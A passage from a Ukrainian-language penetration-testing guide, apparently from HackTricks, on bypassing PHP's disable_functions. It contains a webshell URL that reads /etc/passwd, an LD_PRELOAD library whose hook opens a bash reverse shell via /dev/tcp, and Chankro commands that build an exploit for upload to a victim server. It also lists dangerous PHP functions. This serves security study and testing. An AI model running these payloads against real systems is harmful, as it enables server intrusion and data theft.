–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ **–∑–∞–∫–æ–º–µ–Ω—Ç–æ–≤–∞–Ω–∏–π —Ä—è–¥–æ–∫ 324**, –≤–∏ –º–æ–∂–µ—Ç–µ –π–æ–≥–æ —Ä–æ–∑–∫–æ–º–µ–Ω—Ç—É–≤–∞—Ç–∏, —ñ **payload –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø—ñ–¥–∫–ª—é—á–∏—Ç—å—Å—è –¥–æ –≤–∫–∞–∑–∞–Ω–æ–≥–æ URL —ñ –≤–∏–∫–æ–Ω–∞—î PHP –∫–æ–¥**, —â–æ –º—ñ—Å—Ç–∏—Ç—å—Å—è —Ç–∞–º.\
–ü—Ä–æ—Å—Ç–æ –æ—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø –¥–æ `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');`, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`.

{% hint style="warning" %}
–í–∏, –º–æ–∂–ª–∏–≤–æ, –¥—É–º–∞—î—Ç–µ, —â–æ —Ç–∞–∫ —Å–∞–º–æ, —è–∫ –º–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é `open_basedir`, –º–∏ –º–æ–∂–µ–º–æ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ `disable_functions`**. –©–æ –∂, —Å–ø—Ä–æ–±—É–π—Ç–µ —Ü–µ, –∞–ª–µ —Ü–µ –Ω–µ —Å–ø—Ä–∞—Ü—é—î, –æ—á–µ–≤–∏–¥–Ω–æ, **`disable_functions` –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –ª–∏—à–µ –≤ —Ñ–∞–π–ª—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó `.ini` php**, —ñ –∑–º—ñ–Ω–∏, —è–∫—ñ –≤–∏ –≤–∏–∫–æ–Ω—É—î—Ç–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é PHP\_VALUE, –Ω–µ –±—É–¥—É—Ç—å –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º–∏ –¥–ª—è —Ü—å–æ–≥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è.
{% endhint %}

## –û–±—Ö—ñ–¥ disable\_functions

–Ø–∫—â–æ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è –≤–∏–∫–æ–Ω–∞—Ç–∏ PHP –∫–æ–¥ –Ω–∞ –º–∞—à–∏–Ω—ñ, –≤–∏, –Ω–∞–ø–µ–≤–Ω–æ, –∑–∞—Ö–æ—á–µ—Ç–µ –ø–µ—Ä–µ–π—Ç–∏ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä—ñ–≤–µ–Ω—å —ñ **–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ —Å–∏—Å—Ç–µ–º–Ω—ñ –∫–æ–º–∞–Ω–¥–∏**. –£ —Ü—ñ–π —Å–∏—Ç—É–∞—Ü—ñ—ó –∑–∞–∑–≤–∏—á–∞–π –≤–∏—è–≤–ª—è—î—Ç—å—Å—è, —â–æ –±—ñ–ª—å—à—ñ—Å—Ç—å –∞–±–æ –≤—Å—ñ PHP **—Ñ—É–Ω–∫—Ü—ñ—ó**, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, –±—É–ª–∏ –≤–∏–º–∫–Ω–µ–Ω—ñ** –≤ **`disable_functions`.**\
–û—Ç–∂–µ, –¥–∞–≤–∞–π—Ç–µ –ø–æ–¥–∏–≤–∏–º–æ—Å—è, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è (—è–∫—â–æ –∑–º–æ–∂–µ—Ç–µ)

### –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è –æ–±—Ö–æ–¥—É

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser), —ñ –≤—ñ–Ω –≤–∫–∞–∂–µ –≤–∞–º, —è–∫–∞ —Ñ—É–Ω–∫—Ü—ñ—è (—è–∫—â–æ —Ç–∞–∫–∞ —î) –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è **–æ–±—Ö–æ–¥—É** **`disable_functions`**.

### –û–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—à–∏—Ö —Å–∏—Å—Ç–µ–º–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π

–ü—Ä–æ—Å—Ç–æ –ø–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –Ω–∞ –ø–æ—á–∞—Ç–æ–∫ —Ü—ñ—î—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —ñ **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –Ω–µ –≤–∏–º–∫–Ω–µ–Ω–∞ –∂–æ–¥–Ω–∞ –∑ —Ñ—É–Ω–∫—Ü—ñ–π –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ —ñ –¥–æ—Å—Ç—É–ø–Ω–∞ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ**. –Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Ö–æ—á–∞ –± –æ–¥–Ω—É –∑ –Ω–∏—Ö, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ó—ó –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –∫–æ–º–∞–Ω–¥.

### –û–±—Ö—ñ–¥ LD\_PRELOAD

–î–æ–±—Ä–µ –≤—ñ–¥–æ–º–æ, —â–æ –¥–µ—è–∫—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤ PHP, —Ç–∞–∫—ñ —è–∫ `mail()`, –±—É–¥—É—Ç—å **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–∫–∏ –≤ —Å–∏—Å—Ç–µ–º—ñ**. –¢–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –Ω–∏–º–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∑–º—ñ–Ω–Ω—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ `LD_PRELOAD`, —â–æ–± –∑–º—É—Å–∏—Ç–∏ —ó—Ö –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É, —è–∫–∞ –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ —â–æ –∑–∞–≤–≥–æ–¥–Ω–æ.

#### –§—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –æ–±—Ö–æ–¥—É disable\_functions –∑ LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: –ï—Ñ–µ–∫—Ç–∏–≤–Ω–æ, –∫–æ–ª–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π –º–æ–¥—É–ª—å `php-mbstring`.
* **`imap_mail`**: –ü—Ä–∞—Ü—é—î, —è–∫—â–æ –ø—Ä–∏—Å—É—Ç–Ω—ñ–π –º–æ–¥—É–ª—å `php-imap`.
* **`libvirt_connect`**: –ü–æ—Ç—Ä–µ–±—É—î –º–æ–¥—É–ª—å `php-libvirt-php`.
* **`gnupg_init`**: –ú–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–º –º–æ–¥—É–ª–µ–º `php-gnupg`.
* **`new imagick()`**: –¶–µ–π –∫–ª–∞—Å –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–ª—è –æ–±—Ö–æ–¥—É –æ–±–º–µ–∂–µ–Ω—å. –î–µ—Ç–∞–ª—å–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ –∫–æ–º–ø–ª–µ–∫—Å–Ω–æ–º—É [**–æ–ø–∏—Å—ñ —Ç—É—Ç**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

–í–∏ –º–æ–∂–µ—Ç–µ [**–∑–Ω–∞–π—Ç–∏ —Ç—É—Ç**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Ñ—É–∑–∑–∏–Ω–≥—É, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤—Å—è –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ü–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π.

–û—Å—å –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞, —è–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏, —â–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –∑–º—ñ–Ω–Ω–æ—é —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ `LD_PRELOAD`:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Bypass using Chankro

–©–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–º –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º, –≤–∏ –º–æ–∂–µ—Ç–µ [**Chankro**](https://github.com/TarlogicSecurity/Chankro). –¶–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π **–≥–µ–Ω–µ—Ä—É—î PHP –µ–∫—Å–ø–ª–æ–π—Ç**, —è–∫–∏–π –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–∏–π —Å–µ—Ä–≤–µ—Ä —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ (–¥–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ –≤–µ–±).\
**Chankro** –∑–∞–ø–∏—à–µ –Ω–∞ –¥–∏—Å–∫ –∂–µ—Ä—Ç–≤–∏ **–±—ñ–±–ª—ñ–æ—Ç–µ–∫—É —Ç–∞ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª**, —è–∫—É –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏, —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—î **`LD_PRELOAD` —Ç—Ä—é–∫ + PHP `mail()`** —Ñ—É–Ω–∫—Ü—ñ—é –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª—É.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **Chankro**, `mail` —Ç–∞ `putenv` **–Ω–µ –º–æ–∂—É—Ç—å –∑'—è–≤–ª—è—Ç–∏—Å—è –≤ —Å–ø–∏—Å–∫—É `disable_functions`**.\
–£ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç chankro** –¥–ª—è **arch 64**, —è–∫–∏–π –≤–∏–∫–æ–Ω–∞—î `whoami` —ñ –∑–±–µ—Ä–µ–∂–µ –≤–∏—Ö—ñ–¥ —É _/tmp/chankro\_shell.out_, chankro **–∑–∞–ø–∏—à–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É —Ç–∞ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è** –≤ _/tmp_ —ñ **–∫—ñ–Ω—Ü–µ–≤–∏–π –µ–∫—Å–ø–ª–æ–π—Ç** –±—É–¥–µ –Ω–∞–∑–∏–≤–∞—Ç–∏—Å—è **bicho.php** (—Ü–µ —Ñ–∞–π–ª, —è–∫–∏–π –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∂–µ—Ä—Ç–≤–∏):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{% endtab %}

{% tab title="Chankro" %}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ —Ñ—É–Ω–∫—Ü—ñ—è **mail** –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–∞ —á–µ—Ä–µ–∑ –∑–∞–±–æ—Ä–æ–Ω–µ–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, –≤–∏ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é **mb\_send\_mail.**\
–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —Ç–∞ Chankro —Ç—É—Ç: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "–û–±—Ö—ñ–¥" –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π PHP

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **PHP** –≤–∏ –º–æ–∂–µ—Ç–µ **—á–∏—Ç–∞—Ç–∏ —Ç–∞ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏, —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –∫–∞—Ç–∞–ª–æ–≥–∏ —Ç–∞ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –¥–æ–∑–≤–æ–ª–∏**.\
–í–∏ –Ω–∞–≤—ñ—Ç—å –º–æ–∂–µ—Ç–µ **–≤–∏–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö**.\
–ú–æ–∂–ª–∏–≤–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **PHP** –¥–ª—è **–ø–µ—Ä–µ—Ä–∞—Ö—É–Ω–∫—É** —Å–∏—Å—Ç–µ–º–∏, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Å–ø–æ—Å—ñ–± –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó/–≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –¥–µ—è–∫–∏–π –ø—Ä–∏–≤–∞—Ç–Ω–∏–π ssh –∫–ª—é—á).

–Ø —Å—Ç–≤–æ—Ä–∏–≤ –≤–µ–±-–æ–±–æ–ª–æ–Ω–∫—É, —è–∫–∞ –¥—É–∂–µ —Å–ø—Ä–æ—â—É—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü–∏—Ö –¥—ñ–π (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –±—ñ–ª—å—à—ñ—Å—Ç—å –≤–µ–±-–æ–±–æ–ª–æ–Ω–æ–∫ —Ç–∞–∫–æ–∂ –∑–∞–ø—Ä–æ–ø–æ–Ω—É—é—Ç—å –≤–∞–º —Ü—ñ –æ–ø—Ü—ñ—ó): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### –û–±—Ö–æ–¥–∏, –∑–∞–ª–µ–∂–Ω—ñ –≤—ñ–¥ –º–æ–¥—É–ª—ñ–≤/–≤–µ—Ä—Å—ñ–π

–Ü—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –æ–±—ñ–π—Ç–∏ disable\_functions, —è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫–∏–π—Å—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –º–æ–¥—É–ª—å –∞–±–æ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –ø–µ–≤–Ω—É –≤–µ—Ä—Å—ñ—é PHP:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**–û–±—Ö—ñ–¥ –∑ FFI - —É–≤—ñ–º–∫–Ω–µ–Ω–∏–π Foreign Function Interface**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**–û–±—Ö—ñ–¥ —á–µ—Ä–µ–∑ mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Extension Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**dl function**](disable\_functions-bypass-dl-function.md)
* [**–¶–µ–π –µ–∫—Å–ø–ª–æ–π—Ç**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–æ –∑ –Ω–µ–∑–Ω–∞—á–Ω–∏–º–∏ –∑–º—ñ–Ω–∞–º–∏ –≤ PoC
* 7.0 - –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ
* 7.1 - –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ
* 7.2 - –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ
* 7.3 - –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ
* 7.4 - –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ
* 8.0 - –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ
* [**–ó 7.0 –¥–æ 8.0 –µ–∫—Å–ø–ª–æ–π—Ç (—Ç—ñ–ª—å–∫–∏ Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen –µ–∫—Å–ø–ª–æ–π—Ç**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç**

–ù–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –ø—Ä–æ–±—É—î –¥–µ—è–∫—ñ –∑ –º–µ—Ç–æ–¥—ñ–≤, –∑–≥–∞–¥–∞–Ω–∏—Ö —Ç—É—Ç:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## –Ü–Ω—à—ñ —Ü—ñ–∫–∞–≤—ñ —Ñ—É–Ω–∫—Ü—ñ—ó PHP

### –°–ø–∏—Å–æ–∫ —Ñ—É–Ω–∫—Ü—ñ–π, —è–∫—ñ –ø—Ä–∏–π–º–∞—é—Ç—å –∑–≤–æ—Ä–æ—Ç–Ω—ñ –≤–∏–∫–ª–∏–∫–∏

–¶—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –ø—Ä–∏–π–º–∞—é—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä —Ä—è–¥–∫–∞, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó –Ω–∞ –≤–∏–±—ñ—Ä –∞—Ç–∞–∫—É—é—á–æ–≥–æ. –ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ñ—É–Ω–∫—Ü—ñ—ó, –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ –∞–±–æ –Ω–µ –º–æ–∂–µ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ–¥–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é —Ä–æ–∑–∫—Ä–∏—Ç—Ç—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —Ç–∞–∫—É —è–∫ phpinfo().

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[–ù–∞—Å—Ç—É–ø–Ω—ñ —Å–ø–∏—Å–∫–∏ –∑–≤—ñ–¥—Å–∏](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ–π–Ω–∞ –≤–∏—Ç—ñ–∫

–ë—ñ–ª—å—à—ñ—Å—Ç—å –∑ —Ü–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤ —Ñ—É–Ω–∫—Ü—ñ–π –Ω–µ —î "—Å–∏–Ω–∫–∞–º–∏". –ê–ª–µ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é, —è–∫—â–æ –±—É–¥—å-—è–∫—ñ –∑ –ø–æ–≤–µ—Ä–Ω–µ–Ω–∏—Ö –¥–∞–Ω–∏—Ö –≤–∏–¥–∏–º—ñ –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞. –Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –±–∞—á–∏—Ç–∏ phpinfo(), —Ü–µ –±–µ–∑—É–º–æ–≤–Ω–æ —î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### –Ü–Ω—à–µ
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### –§—É–Ω–∫—Ü—ñ—ó —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏

–ó–≥—ñ–¥–Ω–æ –∑ RATS, –≤—Å—ñ —Ñ—É–Ω–∫—Ü—ñ—ó —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ –≤ php —î –Ω–µ–ø—Ä–∏—î–º–Ω–∏–º–∏. –î–µ—è–∫—ñ –∑ –Ω–∏—Ö –Ω–µ –∑–¥–∞—é—Ç—å—Å—è –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–∏–º–∏ –¥–ª—è –∞—Ç–∞–∫—É—é—á–æ–≥–æ. –Ü–Ω—à—ñ —î –±—ñ–ª—å—à –∫–æ—Ä–∏—Å–Ω–∏–º–∏, –Ω—ñ–∂ –≤–∏ –º–æ–≥–ª–∏ –± –ø–æ–¥—É–º–∞—Ç–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ allow\_url\_fopen=On, —Ç–æ URL –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π —è–∫ —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É, —Ç–æ–º—É –≤–∏–∫–ª–∏–∫ copy($\_GET\['s'], $\_GET\['d']); –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è 